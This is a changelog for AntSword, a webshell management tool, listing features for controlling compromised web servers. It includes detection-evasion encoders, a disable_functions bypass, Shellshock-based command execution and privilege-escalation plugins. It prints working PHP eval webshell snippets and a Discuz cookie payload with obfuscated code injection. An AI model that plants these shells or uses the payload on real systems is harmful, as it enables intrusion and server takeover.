# 更新日志
> 有空会补补BUG、添添新功能。    
> 同时也欢迎大家的参与！感谢各位朋友的支持！ .TAT.

## `v(2.1.6)`

### 其它

* `jsp_custom_script_for_mysql` 提供 `AES` 编码解码示例
* `jsp_custom_script_for_mysql` 增加 Version 显示
* windows 下单击鼠标左键 Tray Icon 显示/隐藏 主窗口 改为 「双击」

## 2019/08/19 `v(2.1.5)`

### 核心模块

* 修复 PHP4 命令执行语法错误 #199 (thx @ier005)
* PHP 执行命令模版代码默认加入常见环境变量 (issue from: https://www.t00ls.net/viewthread.php?tid=52205)

### 系统设置

* 「默认设置」新增「虚拟终端」配置块, 可设置默认字体缩放比例, 最小0.5倍, 最大2倍 (通过快捷键最大可到5倍)

> 拖动 slider bar 之后, 下方可实时预览效果, 点击保存后即可生效(无需重启)

![adefault_terminal.png](https://i.loli.net/2019/08/05/fbKlUpodTuFMVC3.png)

### 虚拟终端

* 新增 `options['tsize']` 可覆盖全局缩放设置
* 支持全局缩放配置 #203

### 插件相关

* 新增插件 [check_rwx-suid](https://github.com/phantom11235/check_rwx-suid) Author: @phantom11235

> 在目标服务器上查询可读可写可执行目录以及可用于suid提权的文件（支持asp,aspx,php）

![check_rwx_suid](https://i.loli.net/2019/08/08/czPuqAjHMD3xWnN.png)

* 新增插件 [inject_und3ad](https://github.com/phantom11235/inject_und3ad) Author: @phantom11235

* 「as_webshell_venom」更新到 `v3.2`

* 「绕过 Disable_functions」更新到 `v0.5`

### 其它

* 修复 Linux Gnome 桌面环境下 minimize 时窗口消失问题 #204

## 2019/07/16 `v(2.1.4)`

### 核心模块

* 增加 PHP 执行命令的函数(`proc_open`,`COM('Wscript.shell')`, `shellshock`) #194

  * `COM` 组件执行命令, 该模块为 Windows 专属, 需要目标在 php.ini 中打开 COM 选项: `com.allow_dcom = true`, 注意, PHP 5.4.5 后,com/dotnet模块已经成了单独的扩展, 所以还需要在 php.ini 中配置 `extension=php_com_dotnet.dll`, 如果 PHP < 5.4.5 则不需要。
  * `shellshock` 利用 bash 破壳(CVE-2014-6271)执行命令, 需要目标的 `/bin/sh` 链接为 `/bin/bash` 且存在破壳漏洞

* 新增全局变量 antSword['module'] 用于存放所有核心模块, 方便在插件中引入

### 文件管理

* 修复标签页编辑文件时,路径过长导致右侧按钮不显示的 bug (#192)
* 新建文件时, 默认内容前面加了 `#` 号(防止在shell当前目录下, 新建 `.htaccess` 语法错误导致整个目录无法解析)

### 虚拟终端

* 新增 `options['exec']` 用于替换当前 Terminal 中生成 payload 函数

### 插件相关

* [绕过 disable_functions](https://github.com/Medicean/as_bypass_php_disable_functions) 更新到 0.4

  * 新增「FastCGI/PHP-FPM」模式

   适用于PHP-FPM/FCGI 监听在 unix socket 或者 tcp socket 上时使用。常见的比如: nginx + fpm。IIS+FPM 使用的是「管道」通信，不适用。

  * 新增「Apache_Mod_CGI」模式

    利用 `.htaccess` 添加一个新的 cgi 后缀, 完成命令执行
  
  * 优化了 `.antproxy.php` 性能问题
  * 修复了 `.antproxy.php` 不会代理 querystring 的问题
  * 以上模式可在 「AntSword-Labs」仓库中找到相关 Docker 环境, 可自行在本机搭建环境测试

## 2019/06/11 `v(2.1.3)`

### 核心模块

* 移除解码器 `decode_str` 方法, 统一调用 `decode_buff` 方法

> `decode_str` 其实相当于是 `decode_buff` 执行后调用了 `toString`

* 解码器解码后, 增加猜解字符编码流程
* 修复 PHP mysqli 指定其它端口时失败的问题
* CUSTOM 类型新增 `hex`, `base64`, `hex_base64` 三种类型解码器 (需要对应 Shell 实现该功能, 参考: `jsp_custom_script_for_mysql.jsp`)

 > hex_base64 是指 shell 返回数据时, 先将明文数据使用 base64 编码, 再将结果 hex 编码

* ASPX 新增 `url_unicode` 编码器 (thx @yzddmr6 https://github.com/AntSwordProject/AwesomeEncoder/issues/2)

> 将 pwd payload 全部转换成 `%uxxxx` 这种形式, eg: `Re` => `%u0052%u0065`

### 文件管理

* 「文件下载」支持多文件下载, **不支持选择「文件夹」** #140

### 其它

* 修复 `jsp_custom_script_for_mysql.jsp` 使用 `base64` 编码器连接数据库时 `characterEncoding` 二次解码导致的无法识别的问题 #171
* 修复 `ASP`、`Custom` 数据库管理导出问题 #172
* `jsp_custom_script_for_mysql.jsp`, `jsp_custom_script_for_oracle.jsp`, `jspx_custom_script_for_mysql.jspx` 新增解码器支持
* 现在可以使用 HomeBrew 来安装、更新 `AntSword-Loader` 和 `AntSword` 了。参见 [homebrew-antsword](https://github.com/AntSwordProject/homebrew-antsword/)

  具体步骤如下:

  1. 添加 antsword 源
  ```
  $ brew tap antswordproject/antsword
  ```
  2. 安装 antsword-loader

  ```
  $ brew cask install antsword-loader
  ```

  3. 安装 antsword

  ```
  $ brew install antsword
  ```

  安装完毕后，运行 AntSword.app, 选择源码目录为 `/usr/local/opt/antsword`

  **如果使用 HomeBrew 来管理antsword-loader 和 antsword 的版本，请一直使用该方式进行管理**

### 插件相关

* 新增 [「免杀Shell生成」插件](https://github.com/yzddmr6/as_webshell_venom) (Author: @yzddmr6)

> 利用随机异或免杀D盾蚁剑版

## 2019/05/13 `v(2.1.2)`

### 核心模块

* 修复 multipart 发包方式 download 发包为空的问题 (`asunescape` 功能引起), 更新后需要关闭程序重启后生效
* 编码器 `ext` 参数新增元素 `opts`, 值为当前 shell 的配置

> 有了这个,你就可以根据 shell 的配置信息来动态的进行加密了, 比如用 Cookie 里面的 SessionID 来作为秘钥
>
> 与之相关的一个 Demo, PHP AES-256-CFB (zeroPadding) 编码器
> https://github.com/AntSwordProject/AwesomeEncoder/blob/master/php/encoder/aes_256_cfb_zero_padding.js
>
> 另一个 Demo, PHP AES-128-ECB (zeroPadding) 编码器
> https://github.com/AntSwordProject/AwesomeEncoder/blob/master/php/encoder/aes_128_ecb_zero_padding.js

* 解码器新增 `ext` 参数, 用于获取 shell 配置和rsa私钥

> 有了这个,解码器可以进行一些更为灵活的用法了. 比如用 Cookie 中的 SessionID 来作为秘钥, 对返回的内容进行解密
>
> 与之相关的一个 Demo, PHP AES-256-CFB (Zero Padding) 解码器
> https://github.com/AntSwordProject/AwesomeEncoder/blob/master/php/decoder/aes_256_cfb_zero_padding.js
>
> 另一个 Demo, PHP AES-128-ECB (pkcs7Padding) 解码器
> https://github.com/AntSwordProject/AwesomeEncoder/blob/master/php/decoder/aes_128_ecb_pkcs7_padding.js

PS: 

* 可以用 `AES-256-CFB` 编码器, 对请求包进行加密, 返回包加密使用 `AES-128-ECB` 解码器

* 也可以用 `AES-128-ECB` 编码器, 对请求包进行加密, 返回包加密使用 `AES-256-CFB` 解码器

当然, 你可以根据自己的喜好, 用自己喜欢的 AES 加密方式, 这些怎么组合, 都看你。你要不喜欢用 AES, 你想用什么就用什么。

* 支持加载用户自定义解码器, 同编码器一样, 现在可以加载用户自己自定义的解码器了, 以PHP为例, 加载位置为 `antData/encoders/php/decoder/`

### 数据管理

* 「添加数据」时自动载入「默认设置」中「数据管理」全局配置内容

![adefault_shellmanager_2.png](https://i.loli.net/2019/04/30/5cc83fb205051.png)

### 其它

* 「默认设置」新增「数据管理」设置, 可配置「是否忽略HTTPS证书」、「默认请求超时时长」、「默认 HTTP Header」和「默认 HTTP Body」

> 该配置项仅在「添加数据」时生效，不影响已有配置的 Shell。在添加数据界面修改相应的值, 仅对当前 Shell 配置产生影响，不会影响到默认配置

![adefault_shellmanager_1.png](https://i.loli.net/2019/04/30/5cc83fafdf0d8.png)

* 新增第三方库 marked 0.6.2 用于 markdown 渲染
* 更新提示窗口新增 ReleaseNote 显示(缩放显示,图片看不清可直接前往 github 查看详细更新日志), 新增 「更新日志」按钮(点击后直接打开 github release 页)
* 「编码管理」新增「获取更多」按钮, 打开浏览器访问 AwesomeEncoder(自定义编码器分享), 如果你有比较好的 Encoder, 欢迎向这个仓库提PR
* 「编码管理」新增解码器管理, 可创建自定义解码器

![aencoder.png](https://i.loli.net/2019/05/13/5cd95654c75ac23085.png)

* 新增第三方库 `crypto-js` 3.1.9-1 , 可以更方便的进行各种加解密处理了

> nodejs 自带 `crypto` 库, 也可使用 `crypto-js` 这个库来进行加密处理, 这个第三方库使用起来相对更简单一些, 但同时限制也会多一些, 自行取舍

## 2019/04/27 `v(2.1.1)`

### 核心模块

* 新增「解码器」(目前仅支持 PHP)

> 将返回数据包进行编码/加密

* 新增 PHP `base64`、`rot13` 解码器

* 修复使用 `__destruct` 类型 shell 时 解码器不生效的 Bug (thx @scanf)

> 取消 `register_shutdown_function` 改为显式调用 `asoutput`

测试 Shell 如下:

```
<?php
class Test{
  function __destruct(){
    @eval($_POST['ant']);
  }
}
$test = new Test;
?>
```

### Shell 管理

* 修复搜索数据时正则表达式输入错误导致crash 问题 #157

### 数据管理

* 添加SQL语句书签功能, 将常用的 SQL 语句保存成书签

![db_bookmark_2.jpg](https://i.loli.net/2019/04/27/5cc3e8ec1c23c.jpg)

* 修复数据库查询结果字段名有逗号时异常

### 其它

* 「默认设置」数据管理项中, 增加「全局书签」设置, 设置一些自己常用的 SQL 语句

![db_bookmark_1.jpg](https://i.loli.net/2019/04/27/5cc3e8ea2abff.jpg)

## 2019/04/24 `v(2.1.0)`

### 重要提醒

从该版本开始, 将逐渐**不兼容老版本加载器**, 建议马上升级 AntSword Loader 到 4.0.3 版本: [下载地址](https://github.com/AntSwordProject/AntSword-Loader/tree/4.0.3)

### 依赖相关更新

* 升级 `Electron` 到 `4.0.3` (Chromium `69.0.3497.106` and Node `10.11.0`)

> 影响较大的是编码器中关于 Buffer 相关的操作, 原来的 `new Buffer()` 方式已被弃用, 请更改为 `Buffer.from()`

* 升级 `Semanticui` 到 `2.2.7`
* 升级 `ACE Editor` 到 `1.4.3`
* 调整 `ant-views://`、`ant-src://`、`ant-static://` 协议, 注册为标准scheme

> 默认情况下 web storage apis (localStorage, sessionStorage, webSQL, indexedDB, cookies) 被禁止访问非标准schemes

* 添加 `node-rsa` 依赖包

### 安全更新

* 主窗口中增加 CSP 策略

### 功能更新

* 新增「复制 Shell URL」功能
* 编码器新增扩展参数
* 编码器添加 RSA 模式，目前仅支持 PHP (@virink)
* 新增 asp `insert_percent` 编码器 #152
* 编码器中支持 `asunescape()` 标记

> asunescape 括号中的内容在HTTP请求时,不会进行urlEncode
>
> eg:
>
> `data["key1"] = "++asunescape(@@@)++";  => "key1=%3B%3B@@@%3B%3B"`

* 新增 Loader 更新检查功能
* 插件市场新增「更新插件」功能

### 插件相关

* 新增 [「绕过disable_functions」插件](https://github.com/Medicean/as_bypass_php_disable_functions) (Author: @Medicean & @howmp)

> 突破 disable_functions 执行系统命令，绕过 Open_basedir 等安全机制

* 新增 [「GodOfHacker」插件](https://github.com/virink/as_plugin_godofhacker) (Author: @virink)

> 黑客神器，谁用谁知道！

## `v(2.0.7.3)

* 主窗口增加 CSP 策略
* Fix self-xss in database config #151 (thx @miaochiahao)
* Fix #153 (thx @ViCrack)
* 复制 Shell URL #144

## `v(2.0.7.2)`

* Fix #150 文件路径输入框未过滤问题
* 修复目录树双击时引起console下报错问题
* 修正 aslistcmd 二次转义问题

## `v(2.0.7.1)`

### 安全更新 (重要)

* Fix toastr 输出时未过滤导致的 xss 漏洞, 由于在 webview 中开启了 nodejs 功能, 可借此引起 RCE #147 (thx @ev0A)

> 为了防止插件中 toastr 出现类似问题, 修改了 toastr 可以输出 html 的特点，以后均不支持输出 html

### 其它

* 修正错别字 #145

## 2019/04/08 `v(2.0.7)`

### 核心

* 执行命令新增 `antsystem` 函数, 具体见: https://github.com/AntSwordProject/ant_php_extension
* Fix 编码器保存后不生效的问题 #135 (thx @K4ngx)
* Fix core download 参数遗漏问题 #142 (thx @RoyTse)
* Fix #141 (thx @RoyTse)

### 虚拟终端

* 新增自定义命令 `aslistcmd`, 列出可使用的命令解释器 (#123)

![aslistcmd.png](https://i.loli.net/2019/04/05/5ca74815a01a4.png)
![aslistcmd_win.png](https://i.loli.net/2019/04/05/5ca74819b276e.png)

* 新增自定义命令 `aspowershell [on|off]`, 开启/关闭 PowerShell 模式

> 如果`ascmd`命令指定的PowerShell解释器文件名中包函`powershell`关键字, 会自动启用 PowerShell 模式, 如下图:

![aspowershell_default](https://i.loli.net/2019/04/05/5ca753673efe7.png)

> 如果指定的 PowerShell 解释器文件名中不包含 `powershell` 关键字, 则需要手动使用该命令，启用 PowerShell 模式。如果关闭了 PowerShell 模式,则会执行出错，如下图:

![aspowershell_switch](https://i.loli.net/2019/04/05/5ca75368d85fa.png)

### 其它

* 修复默认设置保存时导致 bookmarks 清空的问题
* PHP Custom Shell 新增 listcmd 功能
* PHP Custom Shell 新增数据库支持函数检查接口
* 新增「繁體中文(香港)」和「繁體中文(台灣)」两种语言

## 2019/03/20 `v(2.0.6)`

### 后端模块

* 分块传输自动根据黑名单字符(eg: eval, assert, execute, response 等)进行随机切割(thx @phith0n)

### 数据库管理

* 新增「测试连接」功能
* 新增「检测」功能, 检测支持的数据库函数(目前仅 PHP,ASP,ASPX 有效, ASP(X)仅检测使用到的组件是否存在)
* 新增 php `sqlsrv` 连接方式, php5.3之后 mssql 默认不存在,可使用该类型连接 sqlserver >= 2008

> 如果直连shell本地sqlserver, host 部分填 localhost 或者 (local)
>
> 如果连接外部,使用 ip,port

* 新增 php `oracle_oci8` 连接方式, 用于连接 oracle 8i,9i,10g,11g,12c

> host 部分填写: localhost/orcl 或者 localhost:1521/orcl
>
> 参考: http://php.net/manual/zh/function.oci-connect.php  connection_string 部分

* 新增 PHP PostgreSQL 类型数据库操作
* 新增 PHP PostgreSQL_PDO 类型数据库操作 #133 (thx @B0y1n4o4)
* 优化 asp(x) Oracle 类型数据库操作
* 优化 asp(x) SQLServer 类型数据库操作
* 优化SQLServer类型数据库默认查询语句
* php数据管理解析数据时自动猜解编码

### 文件管理

* 新增「在此处打开终端」功能, 打开终端后快速跳到当前目录下
* 新增「全局书签」功能, 可在「系统设置-默认设置」单击鼠标右键添加

![](https://i.loli.net/2019/03/13/5c891b279c26a.png)

![](https://i.loli.net/2019/03/13/5c891b2cc1c30.png)

### 数据管理

* shell 配置页面提示不推荐使用 default、random 编码器, 明文传输 Payload 容易受到转义等影响，未来版本将会考虑移除
* 新增「创建副本」菜单, 复制所选择的 Shell 并在相同分类下创建一个副本
* 新增「搜索数据」功能, 搜索本地数据，范围为当前分类下的 Shell

可选搜索字段： URL(URL地址), Password(密码), Remark(备注), All(在以上几个字段中出现)

> 如果想搜索其它类型的字段, 可直接在类型框中输入想要搜索的字段
>
> 例如搜索 IP地址, 可在搜索字段选择框中输入: ip
>
> 具体字段类型名请直接查阅 antData/db.ant

唤醒快捷键 Ctrl+Shift+F 或者 Command + Shift + F (OSX)

退出:

1) 点击搜索框之外的任何区域

2) 按下 `ESC` 键

3) 再次按下唤醒快捷键

> 在使用快捷键时,如果当前活动 tab 不是数据管理，则会自动跳回数据管理

### 其它

* 新增 「JSP Custom Shell For Oracle」
* 新增 Decodes 自动猜解编码,在中文少量的情况下,成功率会降低
* 系统托盘新增「重启应用」菜单
* 虚拟终端打开后提示本地命令菜单 ashelp

### BugFix

* 修复 asp(x) sqlserver 获取列名,执行自定义SQL语句的异常
* 修复 php mssql 获取列名,执行自定义SQL语句异常

## 2019/03/04 `v(2.0.5)`

### 后端模块

* 新增 chunked 流式传输

![chunk-2.png](https://i.loli.net/2019/01/28/5c4e8869c83ae.png)

### Shell 管理

* 新增「测试连接」功能
* 其它设置增加「开启分块传输」开关，设置「最小分块」和「最大分块」。每次分块大小为[n, m]区间。

![chunk-1.png](https://i.loli.net/2019/01/28/5c4e8868f178a.png)

### 文件管理

* 编辑文件标签打开时显示正在编辑的文件的「IP地址」和「绝对路径」 (#129)
* 编辑文件「保存」按钮移动到右侧

### 插件市场

* 支持使用代理访问插件市场,当配置了代理之后，默认开启

### 浏览网站

* 新增代理开关, 在配置了代理之后，可通过该开关控制是否使用代理浏览目标网站

### Other

* 调整 aproxy uri 初始化 URL 格式

## 2019/01/21 `v(2.0.4)`

### 后端模块

 * 优化返回包解码流程,增加自动猜解编码功能,该功能在中文较少时容易出错,出错了使用用户设置的字符编码

### 文件管理

 * 编辑文件窗口将「编码」按钮替换为「用此编码打开」, 若打开文件之后乱码，不妨试试切换编码
 * 新增「复制文件名」和「复制文件路径」功能，目标复制文件名或路径到剪贴板
 * 编辑文件菜单可选择「标签打开」和「窗口打开」

### 虚拟终端

 * 新增两条本地命令
  * ashelp 列出所有本地命令
  * ascmd  指定某个文件执行后续的命令. eg: ascmd /bin/bash 这样后续输入的命令将会使用 /bin/bash 来执行。注意仅对当前有效, 如果需要持久生效, 需要在shell配置中的「其它配置」设置。

### 系统设置

 * 新增「默认设置」, 可在此配置文件管理默认编辑文件打开方式

### Other

 * 新增 Python2 Custom CGI shell 示例

### BugFix

 * 修复Linux中编码设置中找到不到路径的问题 (#117) thx @H1d3r
 * 修复 Windows shell 盘符小写引起文件管理目录树错乱的 Bug
 * 修复 ASP 文件创建失败和删除失败时提示

### 插件

#### ASRedis

* 新增「虚拟命令行」功能

 ![](https://i.loli.net/2019/01/16/5c3f2134dcd8f.png)

## 2018/12/25 `(v2.0.3)`

### 模块增强

#### Shell 管理

 * 添加 Shell 时 URL 默认前缀 `http://`
 * 添加 Shell 时根据文件后缀选择 Shell 类型并赋予默认编码(asp 默认 GBK, 其它默认 UTF8) #109
 * 其它配置新增 `Multipart 发包` 功能

#### 后端模块

 * 数据存储新增插件配置存储管理功能 (`shell-addPluginDataConf`, `shell-editPluginDataConf`, `shell-delPluginDataConf`, `shell-getPluginDataConf`)
 * 后台发包方式支持 `Multipart`, 可在「编辑Shell配置」-「其它配置」里选择是否开启此功能，默认关闭。(thx @phith0n)

### Bug Fix

 * 修复数据库编码无法保存的 Bug (#110 thx @Twi1ight)
 * 修复 PHP Mysql(i) 数据管理模版代码中编码设置部分的错误 (#110 thx @Twi1ight)

### Other

 * 自动检查更新每24小时触发一次(GitHub 访问频率限制)
 * 插件市场默认窗口大小调整
 * Loading 界面增加了圣诞节彩蛋, 偶尔跟风过个节 🎄 Merry Christmas 🎄

## 2018/12/05 `(v2.0.2)`

### 模块增强

#### Shell 管理

 * 可在 Shell 编辑数据窗口下的`其它设置`栏目下自定义上传文件分片大小 (默认为 500KB, 太大会导致 HTTP 413 错误)

#### 文件管理

 * PHP Shell 下可直接修改文件权限, 显示为4位 8进制数, 如 `0644`

#### 数据管理
 
 * 优化了查询结果显示，默认所有列宽为 100
 * 可将查询结果导出为 CSV 文件
 * PHP Shell MySQL 数据库可视化增强，支持`新建数据库`,`删除数据库`,`新建表`,`修改表名`,`删除表`,`编辑列名`,`删除列`

#### 虚拟终端

 * 虚拟终端界面下使用 `Ctrl` + `=`(和`+`在一起的那个键) 可放大, `Ctrl` + `-` 可缩小

#### 浏览网站

 * 新增了地址栏, 面对需要先进入登录页面的 Shell, 可先在此处访问 login 页面，然后保存 Cookie 到 Shell 配置。 默认为 Shell 的 URL
 * 调整了工具栏按钮的排列
 * 关闭了默认自动打开 URL,需要手动点击「浏览」按钮

### Bug Fix

 * 修正 windows 客户端下用户编码器路径解析错误的问题

### Other

 * 数据分割符随机化，再也不是之前固定的 `->|` 和 `|<-` 了
 * 支持返回状态为 404, 500, 403 等非 200 的 Shell (#103 thx @Curz0n)，一个简单的例子如下：
  
  ```
    <?php http_response_code(404);@eval($_POST['ant']);?>
  ```

 * JSP Shell 基础信息调整, 现在默认的目录为 shell 编译后的 class 文件所在目录
 * 关于页面新增 [Discord 在线交流地址](https://discord.gg/Uzh5nUf)

## 2018/09/12 `(v2.0.1)`

### 插件

* 新增 [「LiveScan」](https://github.com/virink/LiveScan) 插件 (Author: @virink)

 > Webshell存活弹出插件

 1. 通过请求 Webshell 并判断返回数据是否一致判断 Webshell 是否存活
 2. 仅对 PHP,ASP,ASPX 有效
 3. 一键将失联的 Webshell 移动到 `[.Trash]` 分类
 4. 一键清空 `[.Trash]` 分类

### Bug Fix

* 修正下载更新时 chunk 导致进度条显示问题
* 修正 Windows 客户端用户自定义编码器加载问题
* 修正 C 盘无权限目录显示的 Bug(#51)
* 修正 Windows 客户端下上传文件路径截取问题(#97 thx @jjf012)
* 修正 Linux 客户端载入源码路径错误的问题 (cbb67dd0)
* 修正 Windows 服务器修改文件时间失败问题(#98 thx @jjf012)
* 修正 ASP Access 数据库显示数据库失败问题

### Other

* PHP虚拟终端执行命令函数增加了 `shell_exec`, `passthru`, `exec`, `popen`
* ASP wget 功能模版 `Microsoft.XMLHTTP` 替换为 `MSXML2.ServerXmlHttp` 支持 https (#98 thx @jjf012)
* 添加「检查更新」菜单
* 提示通过 git 控制源码用户通过 git 命令增量更新(http下载的源码暂时不支持增量更新)

## 2018/08/25 `(v2.0.0)`

### 模块增强

* **新增源代码加载器**

 从 **v2.0.0-beta** 版本开始，我们引入了**加载器**这一概念。
 
 用户/开发者只需要下载对应平台的加载器，无需安装额外的环境，即可对源代码进行**编辑**、**执行**、**调试**等操作。可直接运行>=v2.0-beta版本的**开发版**和**发行版**源代码。
 
 > 有关「加载器」的具体使用方式，可直接查阅 《[AntSowd文档——获取蚁剑](https://doc.u0u.us/zh-hans/getting_started/get_antsword.html)》
 
 ![首次打开加载器](http://7xtigg.com1.z0.glb.clouddn.com/doc/getting_started/get_antsword_1.jpg)

* **新增「加载插件」模块**

 从 **v2.0.0-beta** 版本开始，我们引入了「插件」这一概念，用户可在不修改核心框架的情况下，通过安装不同的插件来增强、扩展蚁剑的功能。
 
 端口扫描、Socks代理、反弹Shell、内网漏洞扫描、内网代理浏览器、内网漏洞溢出测试、后门扫描、密码爆破、打包下载、交互式终端、权限提升...
 
 **这里将没有任何拘束，可以尽情展现出你对WebShell的理解**。
 
 安装插件后，可通过「加载插件」模块调用指定插件。插件有两种调用方式，分别为「单个调用」和「批量调用」，在加载插件后，根据具体的插件显示不同的结果。
 
 > 有关「加载插件」的使用方式，可直接查阅 《[AntSowd文档——加载插件](https://doc.u0u.us/zh-hans/plugins/load_plugin.html)》
 >
 > 如果你对编写插件有兴趣，可查阅 《[AntSowd文档——插件开发](https://doc.u0u.us/zh-hans/plugin_dev/index.html)》，学习如何编写自己的插件。

 **调用插件：**
 
 ![调用 phpinfo插件](http://7xtigg.com1.z0.glb.clouddn.com/doc/plugins/load_plugin_1.jpg)
 
 **端口扫描插件的调用结果：**
 ![端口扫描插件](http://7xtigg.com1.z0.glb.clouddn.com/doc/plugins/load_plugin_4.jpg)
 
* **新增「插件市场」模块**

 有了插件功能，如何获取插件呢？从 **v2.0.0-beta** 版本开始，我们引入了「插件市场」。插件作者可将自己插件提交至「插件市场」，向所有AntSword使用者分享自己的插件。

 > 详见《[AntSowd文档——插件市场](https://doc.u0u.us/zh-hans/plugin_store/index.html)》

 ![插件市场](http://7xtigg.com1.z0.glb.clouddn.com/doc/plugin_store/main_page_2.jpg)

* **新增「编码管理」模块**(thx @virink)

 现在可以在「系统设置 - 编码管理」下增加用户自定义的编码器了，不需要拘泥自带的 `base64` 与 `chr`。`rot13`、`base32`、`rc4`、`aes`......尽情发挥吧
 
  ![编码管理](http://7xtigg.com1.z0.glb.clouddn.com/doc/settings/encoder_edit_1.png)

* **新增「显示设置」模块**

 Shell数据列表显示太多，有些列就不能隐藏掉吗？完全没问题。

* **新增「浏览网站」模块**

 碰到需要 Cookie 或者 Basic 认证的站点还要我亲自抓包来填到请求头上去？太麻烦了，直接浏览网站后点击「保存」就能自动将结果添加到 Shell 设置里了。

### 功能增强

* **新增「网站备注」功能**(thx @virink)

 Shell 太多，容易忘记？没关系。添加备注功能来了。

* **新增自定义「HTTP 头」和「请求数据」功能**

 一些奇奇怪怪的 Shell 和奇奇怪怪的网站居然要在请求的时候带上额外的 HTTP 字段？没关系，添加Shell时加上相应的请求字段就好了。

* **新增自定义「HTTP 请求超时」功能**

 默认的 10s 超时在网速慢的时候动不动请求超时简直让人抓狂，呐，根据当前Shell的实际情况修改吧。

* **新增自定义「虚拟终端执行路径」功能**

 偶尔也想换个自己的命令解释程序。

* **新增自定义「虚拟终端缓存」功能**

 网络差的时候，将命令执行结果缓存起来（**默认关闭**）。

* **新增自定义「文件管理缓存」功能**

 网络差的时候，将文件管理的结果缓存起来（**默认开启**）。

* **新增自定义「忽略HTTPS证书」功能**

 过期证书站点请求总是因为证书问题请求失败，那就忽略证书检查吧。

* **新增「随机编码器」功能**

 每次请求时在当前可用编码器中随机选择一种(编码器:「嚯，哈，看我72变」)。

* **优化虚拟终端，新增「命令补全」功能**

 常用的命令敲的多了想吐？来试试在「虚拟终端」下按 **Tab**键自动补全吧。

* **优化虚拟终端, 支持命令行粘贴**

 吐槽了很久的不能粘贴命令的「虚拟终端」终于支持粘贴了。

* **新增「数据库配置」编辑功能**

 再也不用删掉配置新建了。

* **新增「系统托盘」功能**

 窗口多的时候快速隐藏/呼出蚁剑（图标什么的别跟我说丑，你找个好看的给大伙瞅瞅?）。

* **新增「预览文件」功能**

 双击文件自动预览 1.5MB 以内图片，大于该体积的图片可在菜单中选择「预览文件」。
 ![](http://7xtigg.com1.z0.glb.clouddn.com/doc/file_manager/previewfile.png)

* **优化文件管理，文件列表快速跳行**

 按下键盘，自动跳到该字母开头的第一个文件所在行。

* **优化「自动更新」功能**

 程序启动后1分钟自动检查更新，如果存在更新，在提示用户的同时，可直接在线更新。

### 插件

* **新增「端口扫描」插件**

 通过 Shell 扫描内网主机开放的端口。(前面已经看过图了，就不放了)。

* **新增「生成Shell」插件**

 指定密码或者随机产生连接密码，然后随机生成一个 Shell 脚本。
 
 ![生成Shell](http://7xtigg.com1.z0.glb.clouddn.com/plugins/genshell/genshell.png)

* **新增「复制Shell配置」插件**

 团队合作管理网站必备，复制的不仅是个连接密码，还有数据库配置与 HTTP 配置。

* **新增「Shell配置导入」插件**

 跟楼上那个配合使用的 :)
 
 要不你试试导入一下下面这个 Discuz 代码执行，直接连接的模版？
 
 ```
 {"category":"default","url":"http://127.0.0.1/viewthread.php?tid=13&extra=page=1","pwd":"ant","type":"php","ip":"127.0.0.1","addr":"IANA 保留地址用于本地回送","encode":"UTF8","encoder":"chr","httpConf":{"body":{},"headers":{"Cookie":"GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui;GLOBALS[_DCACHE][smilies][replacearray]=eval(CHR(64).CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(39).CHR(97).CHR(110).CHR(116).CHR(39).CHR(93).CHR(41).CHR(59))%3B;"}},"otherConf":{"command-path":"","ignore-https":1,"request-timeout":"5000","terminal-cache":0},"ctime":1489394564927,"utime":1533179198874,"_id":"8Uhsn1z0yeUXS5iG","note":""}
 ```

* **新增「超级终端」插件**

 虚拟终端执行命令不能交互，想要个交互式的 Shell？还想直接穿透内网？这里有个Demo了解一下？
 
 [WebShell下的交互式Shell](http://blog.evalbug.com/2018/07/25/antsword_prompt_shell/)
 
 > 该插件暂时不太稳定，鉴于有朋友想尝试一下，所以提前上了，别抱太大希望。

* **新增「BugScan 插件」插件**

 通过 Shell 快速创建 BugScan 节点，然后就可以对内网进行安全检测了。

### 其它
* 新增 ASP xxxxdog 编码器与对应 Shell 示例

 这个编码器只能用连接专属 Shell。试着阅读一下这两个脚本，对你编写自己的编码器和专属Shell会很有帮助。
* 新增 PHP `chr16`、`rot13` 编码器
* 新增 JSPX Script 示例
* 新增 ASP.Net eval Script 示例
* 新增 ASP.Net Custom Script 示例
* 修复 PHP Shell 读特殊文件无返回问题
* 修复Windows存在A盘时hang住的问题
* 新增更新 HTTP 配置 API
* 修复插件市场删除插件失败的问题
* 修复多窗口关闭错误问题
* 修复一些数据错误
* 优化清空所有缓存功能
* 优化删除缓存功能
* 优化删除数据功能
* 优化编辑数据功能
* 一些细节的调整
* 更新 FontAwesome 库到 **v4.5.0**
* 更新 electron API 到 **v1.2.3**
 > 这个版本号读起来顺

* 移除 log4js 模块，把后端日志传递到前端输出

 打开「开发者工具」，在「Console」下试着敲 `antSword["logs"]` 就可查看日志啦。

## 2016/05
### /03-30
  **进行了大范围的代码重写以及新功能增加**
  1. 插件市场包括下载管理等设计
  2. 插件执行包括模块化等架构
  3. 日志输出以及其他多出细节的调整

### /02
  1. 移除`babel`依赖，采用原生ES6进行前端架构
  2. 移除`document`以及`screenshots`目录，减少体积
  3. 移除`log4js`模块，把后端日志输出转换到前台控制台

## 2016/04

### /30 `(v1.3.0)`
  1. 重构优化部分代码，删除部分无用资源

### /29
  1. 增加php中的`mysql`数据库模板，用于不支持使用`mysqli`的服务器

### /28
  1. 修正custom shell 读取自身时数据被截断的 bug
  2. 添加 aspx hex encoder 支持

### /27
  1. 新增了后端配置文件`modules.config.js`
  2. 重写优化了部分后端模块
  3. 使用了`npm3`进行依赖模块安装，便于打包发布

### /25
  1. 移除`webpack`以及其他不必要的依赖，直接无需编译即可执行ES6代码（有新模块`babel`的加入，请使用`npm install`初始化
  2. 更新美化关于页面
  3. 重构`modules/request.js`后端数据请求模块

### /24 `(v1.2.1)`
  1. 重写前端资源加载方案
  2. 优化部分ES6代码

### /23
  1. 更新美化关于页面
  2. 修正 Aspx 中代码根据用户配置自动编码

### /22
  1. 修补 aspx 连接和文件管理的 Bug // &2:Thanks [@Medicean][medicaean-github]
  2. 新添加了 aspx base64 编码器

### /16 `(v1.2.0)`
  1. 重新架构核心模块编码器
  2. 优化shellmanager添加/编辑功能
  3. 重构语言模板加载方案
  4. 增加中文部分开发文档

### /14
  1. 增加文件管理模块拖拽文件上传功能

### /13
  1. 完全重写优化核心代码架构
  2. 增强文件下载功能，支持稳定下载大文件
  3. 优化HTTP请求函数
  4. 增加显示文件管理左侧目录数

### /12
  1. 修复文件管理模板XSS安全问题

### /10 `(v.1.1.2)`
